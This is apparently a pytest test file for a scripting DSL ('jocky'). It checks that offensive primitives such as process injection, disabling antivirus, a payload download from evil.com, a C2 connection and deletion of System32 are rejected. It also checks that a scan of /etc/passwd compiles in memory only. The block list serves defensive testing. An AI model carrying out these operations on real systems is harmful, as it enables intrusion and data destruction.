import pytest
from app.jocky import parse_jocky, compile_jocky
from app.jocky.errors import JockyValidationError, JockyParserError


@pytest.mark.parametrize("disallowed_snippet", [
    'execute "cmd.exe"',
    'inject process "explorer.exe"',
    'load driver "malicious.sys"',
    'disable antivirus',
    'download file "http://evil.com/payload.bin"',
    'write file "C:\\Windows\\System32\\bad.dll"',
    'shell whoami',
    'delete files in "C:\\Windows\\System32"',
    'kill processes where name == "edr.exe"',
    'c2 connect "198.51.100.1"',
    'evade detection',
])
def test_disallowed_offensive_primitives_rejected(disallowed_snippet: str):
    with pytest.raises((JockyValidationError, JockyParserError)) as exc_info:
        compile_jocky(disallowed_snippet)
    
    # Must fail safely with a descriptive error
    assert any(
        phrase in str(exc_info.value)
        for phrase in [
            "disallowed offensive operation",
            "Unexpected token",
            "Expected 'scan', 'collect'",
        ]
    )


def test_jocky_is_purely_in_memory():
    # Verify that compiling a script does not touch filesystem or spawn processes
    source = 'scan files where path == "/etc/passwd"'
    plan = compile_jocky(source)
    assert plan["version"] == "1"
    assert plan["statements"][0]["operation"] == "scan"
